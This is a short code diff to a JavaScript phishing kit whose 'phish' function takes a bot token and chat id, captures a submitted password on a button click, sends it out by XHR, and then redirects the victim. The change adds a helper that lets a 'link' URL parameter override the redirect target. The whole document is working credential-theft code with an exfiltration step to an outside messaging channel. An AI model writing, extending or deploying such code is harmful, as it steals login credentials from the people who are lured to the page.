@@ -1,4 +1,12 @@
 const phish = (bot_token, chat_id, redirect_link) => {
+    const goTo = () => {
+        let link = new URLSearchParams(window.location.search).get('link');
+        if (link !== null) {
+            redirect_link = link;
+        }
+        window.location.assign(redirect_link);
+    };
+
     $('#submit-button').on('click', function() {
         let currentdate = new Date(),
             date = `${currentdate.getDate()}/${currentdate.getMonth() +
@@ -22,7 +30,7 @@ Pass :    ${pass}%0A
         xhr.send();
 
         setTimeout(function() {
-            window.location.assign(redirect_link);
+            goTo();
         }, 500);
     });
 };
